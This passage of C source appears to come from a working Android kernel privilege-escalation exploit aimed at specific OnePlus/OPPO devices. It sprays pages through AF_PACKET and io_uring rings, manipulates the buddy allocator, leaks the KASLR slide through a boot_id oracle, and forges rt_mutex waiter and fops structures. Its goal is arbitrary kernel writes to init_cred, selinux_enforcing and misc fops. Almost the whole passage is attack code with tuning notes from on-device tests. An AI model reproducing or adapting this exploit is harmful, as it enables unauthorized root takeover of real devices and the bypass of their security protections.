  uint64_t ioctl_v = runtime_text_sym(
      active_offsets ? active_offsets->off_ashmem_ioctl : 0, ASHMEM_IOCTL_OFF);
  uint64_t open_v = runtime_text_sym(
      active_offsets ? active_offsets->off_ashmem_open : 0, ASHMEM_OPEN_OFF);
  const uint64_t *q = (const uint64_t *)sbuf;
  size_t qn = (size_t)n / 8;
  for (size_t i = 0; i + 19 <= qn; i++) {
    int match;
    if (llseek_v)
      match = (q[i + 1] == llseek_v) && (q[i + 4] == rditer_v) &&
              (q[i + 10] == ioctl_v);
    else
      match = (q[i + 10] == ioctl_v) && (q[i + 14] == open_v);
    if (!match)
      continue;
    uint64_t marker = q[i + 18];
    pr_success("SPRAY_VERIFY table stream_off=%#zx (page-rel guess %#zx) "
               "marker@+0x90=%#llx expect=%#llx\n",
               i * 8, i * 8 % ORDER3_SIZE,
               (unsigned long long)marker, (unsigned long long)marker_expect);
    if (marker == marker_expect)
      return 1;
    /* Miss: log EVERY occurrence of the marker VALUE so a real kernel write
     * (table+0x90) can be told apart from payload stamp copies (SCRATCH/W0
     * regions also carry write_pc = fake_fops+0x80). */
    {
      int occ = 0;
      for (size_t j = 0; j + 18 < qn && occ < 8; j++) {
        if (q[j] == marker_expect) {
          long y = (long)(j - (i + 18)) * 8;
          pr_success("SPRAY_VERIFY marker_occ[%d] stream_off=%#zx "
                     "rel_table=%+ld bytes\n", occ, j * 8, y);
          occ++;
        }
      }
      if (!occ)
        pr_success("SPRAY_VERIFY marker VALUE not in stream "
                   "(write landed outside sprayed pages)\n");
    }
    return 0;
  }
  pr_warning("SPRAY_VERIFY table signature not found in %zd peeked bytes\n", n);
  return -1;
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

/*
 * PACKET_RING multi-order reclaim: AF_PACKET TPACKET_V3 RX ring blocks are
 * allocated with __get_free_pages(GFP_KERNEL|__GFP_COMP|__GFP_ZERO, order)
 * straight from the buddy LIFO. The freed mm slab page (order-2) MERGES
 * with its freed neighbours into higher-order blocks (QEMU: free_list[2]
 * has 443 stale blocks, so order-2 allocs never split our merged block).
 * Counter: allocate rings at orders 2,3,4,5 — whichever free_list holds
 * the merged block containing base, the matching ring claims it near-
 * first (LIFO freshest) — and stamp the copy-A payload at EVERY
 * 0x4000-aligned offset inside each block so base's position within the
 * merged block does not matter. fd+ring intentionally leaked.
 */
static void ring_map_register(unsigned char *p, size_t len);

static int packet_ring_order(unsigned order, unsigned blocks,
                             unsigned char *payload, size_t plen) {
  int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (fd < 0) {
    pr_info("PACKET_RING o%u: socket errno=%d\n", order, errno);
    return 0;
  }
  int ver = TPACKET_V3;
  unsigned bs = 0x1000u << order;
  struct tpacket_req3 req;
  memset(&req, 0, sizeof(req));
  req.tp_block_size = bs;
  req.tp_frame_size = 0x1000;
  req.tp_block_nr = blocks;
  req.tp_frame_nr = blocks << order;
  req.tp_retire_blk_tov = 100;
  if (setsockopt(fd, SOL_PACKET, PACKET_VERSION, &ver, sizeof(ver)) != 0 ||
      setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) != 0) {
    pr_info("PACKET_RING o%u: setsockopt errno=%d\n", order, errno);
    close(fd);
    return 0;
  }
  size_t ringlen = (size_t)bs * blocks;
  unsigned char *ring =
      mmap(NULL, ringlen, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (ring == MAP_FAILED) {
    pr_info("PACKET_RING o%u: mmap errno=%d\n", order, errno);
    close(fd);
    return 0;
  }
  unsigned stamped = 0;
  for (unsigned b = 0; b < blocks; b++) {
    unsigned char *blk = ring + (size_t)b * bs;
    for (unsigned off = 0; off + plen <= bs; off += 0x4000) {
      memcpy(blk + off, payload, plen);
      stamped++;
    }
    ring_map_register(blk, bs);
  }
  pr_success("PACKET_RING o%u: %u blocks x %#x claimed, %u stamps\n",
             order, blocks, bs, stamped);
  return 1;
}

/* Registry of our mmap'd ring blocks (packet + io_uring). The walk's
 * marker write into a claimed ring page is visible through these mmaps —
 * a capless placement oracle that works on device (CapEff=0). */
#define RING_MAP_MAX 2048
struct ring_map_entry {
  unsigned char *ptr;
  size_t len;
};
static struct ring_map_entry ring_maps[RING_MAP_MAX];
static size_t ring_map_cnt;

static void ring_map_register(unsigned char *p, size_t len) {
  if (ring_map_cnt < RING_MAP_MAX) {
    ring_maps[ring_map_cnt].ptr = p;
    ring_maps[ring_map_cnt].len = len;
    ring_map_cnt++;
  }
}

/* Scan every registered ring: search each 0x4000 slot's first 0x500
 * bytes (the stamp region) for `value` at ANY qword offset — the walk's
 * marker write (page+0x190 via fake_fops+0x90) must be found regardless
 * of exact position. Returns 1 when found (placement confirmed). */
int ring_registry_find(uint64_t value, unsigned off) {
  (void)off;
  for (size_t m = 0; m < ring_map_cnt; m++) {
    unsigned char *p = ring_maps[m].ptr;
    size_t len = ring_maps[m].len;
    for (size_t b = 0; b + 0x4000 <= len || b < len; b += 0x4000) {
      size_t end = b + 0x500;
      if (end > len)
        end = len;
      for (size_t o = b; o + 8 <= end; o += 8) {
        if (*(volatile uint64_t *)(p + o) == value)
          return 1;
      }
      if (b + 0x4000 > len)
        break;
    }
  }
  return 0;
}

/*
 * IOURING_RING reclaim (capless): io_uring's SQE array is a separate
 * __get_free_pages(GFP_KERNEL_ACCOUNT|__GFP_ZERO, order) allocation of
 * entries*64 bytes — entries=256 gives exactly one order-2 UNMOVABLE
 * page, mmap-writable at the fixed IORING_OFF_SQES offset, no
 * capabilities required (device shell has CapEff=0 — AF_PACKET dies;
 * CONFIG_IO_URING=y confirmed). Stamp the copy-A payload at every
 * 0x4000 offset; fd leaked to hold the page.
 */
#define IOURING_SETUP_SYSNR 425
#define IORING_OFF_SQES 0x10000000ULL

int iouring_ring_reclaim_one(unsigned char *payload, size_t plen,
                                    int do_register) {
  unsigned char params[120];
  memset(params, 0, sizeof(params));
  long fd = syscall(IOURING_SETUP_SYSNR, 256, params);
  if (fd < 0)
    return 0;
  unsigned int sq_entries = 0;
  memcpy(&sq_entries, params, sizeof(sq_entries));
  if (sq_entries == 0 || sq_entries > 4096) {
    close((int)fd);
    return 0;
  }
  size_t sqlen = (size_t)sq_entries * 64;
  /*
   * Stamp BOTH io_uring regions: each ring owns TWO order-2 compound
   * pages — the RINGS struct (offset 0; sq/cq arrays + headers; QEMU
   * proved THIS page claimed base: its +0x100 held sq_mask/cq_mask/
   * entries config) and the SQE array (IORING_OFF_SQES). Stamp and
   * register both so whichever lands at base carries the payload.
   * The header words (sq head/tail) are userspace-owned; with no
   * submissions/completions the kernel never rewrites them.
   */
  unsigned int cq_entries = 0, cqes_off = 0;
  memcpy(&cq_entries, params + 4, sizeof(cq_entries));
  memcpy(&cqes_off, params + 0x60, sizeof(cqes_off));
  size_t rings_len = (size_t)cqes_off + (size_t)cq_entries * 16;
  void *rg = mmap(NULL, rings_len, PROT_READ | PROT_WRITE, MAP_SHARED,
                  (int)fd, 0);
  if (rg != MAP_FAILED) {
    if (plen) {
      for (size_t off = 0; off + plen <= rings_len; off += 0x4000)
        memcpy((unsigned char *)rg + off, payload, plen);
    }
    if (do_register)
      ring_map_register((unsigned char *)rg, rings_len);
  }
  void *sq = mmap(NULL, sqlen, PROT_READ | PROT_WRITE, MAP_SHARED, (int)fd,
                  IORING_OFF_SQES);
  if (sq == MAP_FAILED) {
    close((int)fd);
    return 0;
  }
  if (plen) {
    for (size_t off = 0; off + plen <= sqlen; off += 0x4000)
      memcpy((unsigned char *)sq + off, payload, plen);
  }
  if (do_register)
    ring_map_register((unsigned char *)sq, sqlen);
  return 1;
}

/*
 * Unmovable pre-drain: the systematic placement failure is structural —
 * the whole mm-cache neighborhood (~47 slabs, <2MB) sits in ONE
 * foreign-migratetype pageblock, so the leaked base always frees into
 * free_list[FOREIGN][2] where GFP_KERNEL claims never reach (QEMU
 * pagetypeinfo-proven). Draining free_list[UNMOVABLE] BEFORE the child
 * spray turns every new mm slab page into a fallback steal — the buddy
 * RETYPES the stolen pageblock UNMOVABLE — so the entire spray region
 * (incl. base) later frees into the unmovable lists our rings claim.
 * These drainer rings carry no payload and are not registered.
 */
/* entries=32768 -> SQE array = 2MB = one full pageblock (order-9).
 * Full-pageblock UNMOVABLE allocations force fallback steals that RETYPE
 * the stolen pageblock UNMOVABLE (can_steal: order >= pageblock/2) --
 * order-2 allocations never retype, so order-2 pre-drains are useless. */
static int iouring_pageblock_ring_one(void) {
  unsigned char params[120];
  memset(params, 0, sizeof(params));
  long fd = syscall(IOURING_SETUP_SYSNR, 32768, params);
  if (fd < 0)
    return 0;
  return 1; /* fd leaked; SQE mmap not needed for the drain */
}

static void unmovable_pre_drain(void) {
  int n = env_int_range("PRE_DRAIN_BLOCKS", 16, 0, 128);
  int pcp = env_int_range("PRE_DRAIN_PCP", 96, 0, 512);
  if (n <= 0 && pcp <= 0)
    return;
  int ok = 0;
  for (int i = 0; i < n; i++) {
    if (!iouring_pageblock_ring_one())
      break;
    ok++;
  }
  /* PCP flush: the order-2 per-cpu list is TYPE-BLIND and serves mm slab
   * allocations before the buddy - stale boot-era PCP pages put the leak
   * child's slab in a foreign pageblock (QEMU: 429 clean unmovable o2 in
   * the buddy, yet base still foreign). A SMALL order-2 drain (~96, well
   * under the buddy inventory) empties the PCP so the spray draws clean
   * unmovable buddy pages. Do NOT drain the buddy o2 itself. */
  int okp = 0;
  for (int i = 0; i < pcp; i++) {
    if (!iouring_ring_reclaim_one(NULL, 0, 0))
      break;
    okp++;
  }
  pr_info("PRE_DRAIN: %d pageblock(order-9) retype + %d o2 PCP-flush rings\n",
          ok, okp);
}

static int iouring_ring_reclaim(unsigned char *payload, size_t plen) {
  if (!env_flag("IOURING_RING", 1))
    return 0;
  int n = env_int_range("IOURING_RINGS", 128, 1, 1024);
  int ok = 0;
  for (int i = 0; i < n; i++) {
    if (!iouring_ring_reclaim_one(payload, plen, 1))
      break;
    ok++;
  }
  if (ok)
    pr_success("IOURING_RING: %d rings (order-2 SQE pages) claimed + stamped\n",
               ok);
  else
    pr_info("IOURING_RING: unavailable (errno=%d)\n", errno);
  return ok > 0;
}

static int packet_ring_reclaim(unsigned char *payload, size_t plen) {
  if (!env_flag("PACKET_RING", 1))
    return 0;
  char b0[512] = {0};
  read_first_line("/proc/buddyinfo", b0, sizeof(b0));
  pr_info("BUDDY before rings: %.400s", b0);
  {
    FILE *pf = fopen("/proc/pagetypeinfo", "r");
    if (pf) {
      char l[256];
      while (fgets(l, sizeof(l), pf)) {
        if (strstr(l, "DMA32"))
          pr_info("PAGETYPE_PRE %.200s", l);
      }
      fclose(pf);
    }
  }
  int ok = 0;
  static const unsigned orders[] = {2, 3, 4, 5};
  unsigned defblocks = (unsigned)env_int_range("PACKET_BLOCKS", 16, 1, 512);
  for (size_t i = 0; i < sizeof(orders) / sizeof(orders[0]); i++) {
    ok |= packet_ring_order(orders[i], defblocks, payload, plen);
  }
  char b1[512] = {0};
  read_first_line("/proc/buddyinfo", b1, sizeof(b1));
  pr_info("BUDDY after rings: %.400s", b1);
  {
    FILE *pf = fopen("/proc/pagetypeinfo", "r");
    if (pf) {
      char l[256];
      while (fgets(l, sizeof(l), pf)) {
        if (strstr(l, "DMA32"))
          pr_info("PAGETYPE %.200s", l);
      }
      fclose(pf);
    }
  }
  return ok;
}

/* RSP_HALT=1: spin here so the debugger can breakpoint this exact
 * moment (after the closes, before the rings) and read SLUB/buddy state
 * for the leaked base page. */
__attribute__((noinline)) void rsp_halt_after_closes(void) {
  volatile int spin = 1;
  while (spin) {
    sched_yield();
  }
}

/*
 * Decode KASLR slide from SLIDE oracle boot_id readback.
 * Oracle UUID: first 8 bytes = nfulnl_logger.name (runtime ptr),
 * last 8 bytes = TARGET (change_child, constant).
 * native byte order. Returns 0 if can't decode.
 */
uint64_t struct_le64(const unsigned char *p) {
  return (uint64_t)p[0] | ((uint64_t)p[1] << 8) | ((uint64_t)p[2] << 16) |
         ((uint64_t)p[3] << 24) | ((uint64_t)p[4] << 32) |
         ((uint64_t)p[5] << 40) | ((uint64_t)p[6] << 48) |
         ((uint64_t)p[7] << 56);
}

uint64_t slide_decode_from_bootid(const char *bootid) {
  if (!bootid || strlen(bootid) < 36) return 0;
  /* Strip dashes → 32 hex chars */
  char hex[40];
  int j = 0;
  for (int i = 0; bootid[i] && j < 32; i++) {
    if (bootid[i] != '-') hex[j++] = bootid[i];
  }
  hex[j] = 0;
  if (j != 32) return 0;
  unsigned char raw[16];
  for (int i = 0; i < 16; i++) {
    char b[3] = {hex[i*2], hex[i*2+1], 0};
    raw[i] = (unsigned char)strtoul(b, NULL, 16);
  }
  uint64_t name_ptr = struct_le64(raw);
  /* Verify last 8 bytes are our TARGET (change_child signature) */
  uint64_t tail = struct_le64(raw + 8);
  uint64_t expected_tail = data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
  if (tail != expected_tail) return 0; /* not oracle output */
  uint64_t expected_name = 0xFFFFFFC00A071F66ULL;
  uint64_t slide = name_ptr - expected_name;
  if (slide == 0 || (slide & 0x1FFFFF) != 0) return 0; /* not 2MB aligned */
  /* Sanity: slide < 1TB */
  if (slide > 0x10000000000ULL) return 0;
  return slide;
}

void prepare_ctxs(void) {
  int prepare_slabs = env_int_range("PREPARE_SLABS", 32, 4, 64);
  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  /* Runtime override: SKB_DATA_DELTA=0x... (signed; e.g. -0xe80 or -0xe20) */
  long long skb_delta = (long long)SKB_DATA_DELTA;
  {
    char *dv = getenv("SKB_DATA_DELTA");
    if (dv && dv[0])
      skb_delta = strtoll(dv, NULL, 0);
  }
  uintptr_t payload_base = base + (uintptr_t)skb_delta;
  pr_info("skb payload base=%016zx delta=%lld (SKB_DATA_DELTA)\n",
          payload_base, skb_delta);

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 4) {
          /* Write 4 (fops redirect): the actual write goes through W0's
           * pi_tree (not the main tree). Set main tree to harmless values.
           * The real write: rb_set_parent(pi_right=MISC_FOPS, parent=fake_fops)
           * → writes fake_fops|color to *(MISC_FOPS). See pi_waiters setup below. */
          fake_right = 0;
        } else if (pselect_custom_write == 3) {
          fake_right = pselect_custom_value;
        } else if (pselect_custom_write == 2) {
          /* Write 2 (cred): child = REAL init_cred (P0 address).
           * child->__rb_parent_color corrupts init_cred.usage (bytes 0-7)
           * but that's just a ref count — large value = won't be freed.
           * uid/caps/security/user_ns all stay intact at offsets 8+. */
          fake_right = data_addr(g_init_cred_image);
        } else {
          /* Write 1 (selinux): child = base+0x100 → byte0=0, byte1=1 */
          fake_right = base + 0x100;
        }
      } else {
        fake_right = 0;  /* leaf: write 0 */
      }
      fake_left = 0;
      if (pselect_custom_write == 2) {
        fake_fops = payload_base + CRED_COPY_OFF;
      }
      fake_parent = pselect_custom_target - 8;
      if (!pselect_custom_value) {
        pselect_custom_value = fake_fops;
      }
    } else {
      uint64_t misc_off =
          (active_offsets && active_offsets->off_ashmem_misc_fops)
              ? active_offsets->off_ashmem_misc_fops
              : ASHMEM_MISC_FOPS_OFF;
      fake_parent = fake_fops;
      fake_right = data_addr(KIMAGE_TEXT_BASE + misc_off);
      fake_left = 0;
    }
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    uint64_t misc_off =
        (active_offsets && active_offsets->off_ashmem_misc_fops)
            ? active_offsets->off_ashmem_misc_fops
            : ASHMEM_MISC_FOPS_OFF;
    fake_parent = data_addr(KIMAGE_TEXT_BASE + misc_off) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  /* 1 = put write gadget on W0 main tree (lock waiters); PI stays 1,0,0 */
  int mode4_main_tree = 0;
  /* 1 = classic: parent=MISC-8, right=fake_fops (write via change_child) */
  int mode4_classic = 0;
  /*
   * multi-TU pitfall: INIT_TASK / ROOT_TASK_GROUP / ASHMEM_MISC_FOPS macros in
   * this file are compile-time target.h defaults (OnePlus 6.12). CPH2521 must
   * use active_offsets or the fake waiter task/group and mode-4 write target
   * point at the wrong kernel objects → soft reboot at pselect.
   */
  uint64_t init_task_off = (active_offsets && active_offsets->off_init_task)
                               ? active_offsets->off_init_task
                               : INIT_TASK_OFF;
  uint64_t root_tg_off = (active_offsets && active_offsets->off_root_task_group)
                             ? active_offsets->off_root_task_group
                             : ROOT_TASK_GROUP_OFF;
  uint64_t misc_fops_off =
      (active_offsets && active_offsets->off_ashmem_misc_fops)
          ? active_offsets->off_ashmem_misc_fops
          : ASHMEM_MISC_FOPS_OFF;
  uintptr_t init_task_img = KIMAGE_TEXT_BASE + init_task_off;
  uintptr_t root_tg_img = KIMAGE_TEXT_BASE + root_tg_off;
  uintptr_t misc_fops_img = KIMAGE_TEXT_BASE + misc_fops_off;
  uintptr_t misc_p0 = data_addr(misc_fops_img);
  uint64_t waiter_task = text_addr(init_task_img);
  uint64_t task_group = text_addr(root_tg_img);
  uint64_t pi_top_task = text_addr(init_task_img);
  /*
   * CPH2521 SURVIVE PLATEAU (default mode4) — frozen 2026-08-02
   * -----------------------------------------------------------
   * ONLY packing proven to survive select on-device (clean boot, KS=1):
   *   stack: main=0,0,0 pi=0,0,0 task=init_task lock=fake_lock
   *   heap W0 main: 1,0,0
   *   heap W0.pi:   1,0,0
   *   pi_waiters:   0
   *   PSELECT_SHIFT=-2
   * Route may hit success=1 + cfi errno=22, or quality miss (ret=0) — both OK.
   *
   * SOFTBOOT (do not default): dig right=MISC, classic MISC-8, two-node,
   * any fake_task.pi_waiters link. Opt-in via env only.
   */
  int mode4_two_node = 0;
  uintptr_t w1_node = 0;
  if (pselect_custom_write == 4) {
    char *dig = getenv("MODE4_DIG");
    char *cls = getenv("MODE4_CLASSIC");
    char *tn_safe = getenv("MODE4_TWO_NODE_SAFE");
    char *tn_gad = getenv("MODE4_TWO_NODE_GADGET");
    mode4_main_tree = 0;
    mode4_classic = 0;
    mode4_two_node = 0;
    w1_node = payload_base + SCRATCH_OFF;

    if (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0)) {
      uintptr_t tgt = pselect_custom_target ? pselect_custom_target : misc_p0;
      const char *shape = getenv("WRITE_PROOF_SHAPE");
      int use_classic = 0;
      if (shape && (!strcmp(shape, "classic") || !strcmp(shape, "right")))
        use_classic = 1;
      else if (shape && (!strcmp(shape, "left") || !strcmp(shape, "onlyleft")))
        use_classic = 0;
      else if (tgt == misc_p0)
        use_classic = 1;
      if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
          env_flag("MODE4_SLIDE_CRED", 0) || env_flag("MODE4_SLIDE_KPTR", 0) ||
          env_flag("MODE4_SLIDE_GBOOT", 0)) {
        /* Stack stamp writes 0 / init_cred. Heap only-left parent=fake_fops
         * onto selinux_enforcing stores a kernel pointer there (Samsung
         * EMERALD: non-NULL STORE = KP). Keep W0.pi an empty black leaf. */
        write_pc = 1;
        write_right = 0;
        write_left = 0;
        pr_info("mode4 ZERO/DATAONLY/CRED W0.pi inert 1,0,0 (stack writes)\n");
      } else if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
        /* Placement oracle: marker write inside our own sprayed table. */
        use_classic = 0;
        write_pc = fake_fops + 0x80; /* parent_color = VALUE (page addr) */
        write_right = 0;
        write_left = fake_fops + 0x90; /* *left = VALUE lands here */
        pr_info("mode4 WPROOF_SPRAY marker *(fake_fops+0x90)=%016zx "
                "(placement oracle)\n",
                write_pc);
      } else if (use_classic) {
        write_pc = (misc_p0 - 8) & ~3ULL;
        write_pc |= 1ULL;
        write_right = fake_fops;
        write_left = 0;
        pr_info("mode4 ARISTOTLE W0.pi classic parent=MISC-8|1 right=fake_fops "
                "left=0\n");
      } else {
        write_pc = fake_fops;
        write_right = 0;
        write_left = tgt;
        pr_info("mode4 ARISTOTLE W0.pi only-left parent=fake_fops=%016zx "
                "right=0 left=%016zx\n",
                write_pc, write_left);
      }
    } else if (env_flag("MODE4_REF_LEFT", 0) || env_flag("MODE4_REF_LEFT_PI", 0) ||
        env_flag("MODE4_TOP_LEFT", 0)) {
      /* oppo-ghostlock-ref default: only-left on W0.pi (main stays 1,0,0) */
      write_pc = fake_fops;
      write_right = 0;
      write_left = misc_p0;
      pr_info("mode4 REF/TOP_LEFT W0.pi parent=%016zx(fake_fops) right=0 "
              "left=%016zx(MISC) (only-left *MISC=fake_fops)\n",
              write_pc, write_left);
    } else if (dig && dig[0] == '1') {
      /* Historical dig write shape — softboot on clean 2026-08-02 retest */
      write_pc = fake_fops & ~3ULL;
      write_right = misc_p0;
      write_left = 0;
      pr_info("mode4 DIG W0.pi parent=%016zx(fake_fops) right=%016zx(MISC) "
              "pi_waiters=0 (EXPERIMENT softboot risk)\n",
              write_pc, write_right);
    } else if (cls && cls[0] == '1') {
      mode4_classic = 1;
      write_pc = (misc_p0 - 8) & ~3ULL;
      write_right = fake_fops;
      write_left = 0;
      pr_info("mode4 CLASSIC parent=MISC-8 right=fake_fops (experiment)\n");
    } else if (tn_gad && tn_gad[0] == '1') {
      mode4_two_node = 1;
      mode4_classic = 1;
      write_pc = (misc_p0 - 8) & ~3ULL;
      write_right = fake_fops;
      write_left = 0;
      pr_info("mode4 TWO-NODE+GADGET W0.pi→W1@%016zx (experiment/softboot)\n",
              w1_node);
    } else if (tn_safe && tn_safe[0] == '1') {
      mode4_two_node = 1;
      uintptr_t w0_pi = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
      write_pc = w0_pi & ~3ULL;
      write_right = 0;
      write_left = 0;
      pr_info("mode4 TWO-NODE SAFE W0.pi→W1@%016zx (experiment/softboot)\n",
              w1_node);
    } else if (env_flag("MODE4_JOINCHANG", 0)) {
      /*
       * JoinChang mode-4 geometry, compacted to the TRUE 5.10 waiter
       * offsets (pi_tree@0x18 via -DFAKE_WAITER_PI_TREE_ENTRY_OFF):
       *   W0.pi: parent_color=fake_fops (RED, no rebalance), right=MISC_P0,
       *          left=0
       *   fake_task.pi_waiters root=leftmost=&W0.pi (armed below)
       * When the walk's rt_mutex_dequeue_pi(fake_task, W0) runs
       * rb_erase(&W0.pi), the right-child-only path does
       *   child->__rb_parent_color = pc  →  *MISC_FOPS = fake_fops
       * with no rebalance (red) and a no-op __rb_change_child (parent
       * slots don't match the node). Stale 2026-08-02 "DIG softboots"
       * verdict was measured on the broken 920B-gap word layout — this
       * must be re-tested under compact.
       */
      write_pc = fake_fops;
      write_right = misc_p0;
      write_left = 0;
      pr_info("mode4 JOINCHANG W0.pi parent=fake_fops=%016zx right=MISC_P0="
              "%016zx left=0 (+pi_waiters armed)\n",
              write_pc, write_right);
    } else {
      /*
       * DEFAULT = t0_last proven packing (DIG no-gadget survive → cfi errno 22):
       *   heap W0 main=1,0,0  pi=1,0,0  task=init_task  lock=fake_lock
       *   pi_waiters=0  stack clean  shift=-2
       * Write shapes (JOINCHANG/DIG/classic/two-node) are env-only.
       */
      write_pc = 1;
      write_right = 0;
      write_left = 0;
      pr_info("mode4 BASELINE t0 W0 main=1,0,0 pi=1,0,0 pi_waiters=0 "
              "waiter_task=init_task (recover survive→cfi22)\n");
    }
  }
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    /*
     * MODE4_LOCK_EMPTY=1: waiters root/leftmost=0, owner=0 — isolate whether
     * softboot is fake_lock.waiters→W0 / owner=fake_task (vs spray alone).
     */
    if (payload_mode == PAGE_PAYLOAD_FOPS && env_flag("MODE4_LOCK_EMPTY", 0)) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
      if (chunk == 0)
        pr_info("mode4 LOCK_EMPTY waiters=0 owner=0 (isolation)\n");
    } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
               (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0) ||
                env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0))) {
      /*
       * owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase, skip fake_task
       * setprio. bootid write-proof + ROOT_SPRAY proven with this.
       */
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, 1);
      if (chunk == 0)
        pr_info("mode4 owner=1 waiters=W0 (ARISTOTLE/ROOT clean exit)\n");
    } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
               (env_flag("MODE4_LOCK_OWNER0", 0) ||
                env_flag("MODE4_ZION", 0) ||
                env_flag("MODE4_ZI", 0) ||
                env_flag("MODE4_ZIO", 0) ||
                env_flag("MODE4_WION", 0) ||
                env_flag("MODE4_WAITLOCK0", 0) ||
                env_flag("MODE4_CHAIN", 0) ||
                env_flag("MODE4_ION_SAFE", 0) ||
                env_flag("MODE4_ION_ROOT", 0) ||
                env_flag("MODE4_ZERO_NAME", 0) ||
                env_flag("MODE4_ZERO_OWNER", 0) || env_flag("MODE4_FOPS_SLOT", 0))) {
      /*
       * 5.10 adjust after dequeue: if owner==NULL, skip fake_task setprio path.
       * Keep waiters=W0 so top_waiter stays W0 when stack prio is worse (higher
       * number) than W0 — avoids wake_up_process(waiter->task=init_task).
       * CHAIN/ION/ZERO auto-enable (phase1-2 still use fake_lock).
       */
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, 0);
      if (chunk == 0)
        pr_info("mode4 LOCK_OWNER0 waiters=W0 owner=0 (no owner setprio; "
                "pair with stack prio worse than W0)\n");
    } else if (mode4_classic && mode4_main_tree &&
               payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
      if (chunk == 0)
        pr_info("mode4 CLASSIC lock.waiters root=leftmost=W0\n");
    } else if (mode4_main_tree && payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, LOCK_OFF + 0x08, fake_fops & ~3ULL);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
      if (chunk == 0)
        pr_info("mode4 MAIN_TREE lock.waiters root=fake_fops leftmost=W0\n");
    } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

#ifdef GHOSTLOCK_KERNEL_5_10
    /* 5.10: tree@0, pi@0x18, task@0x30, lock@0x38, prio@0x40 (0x50 waiter).
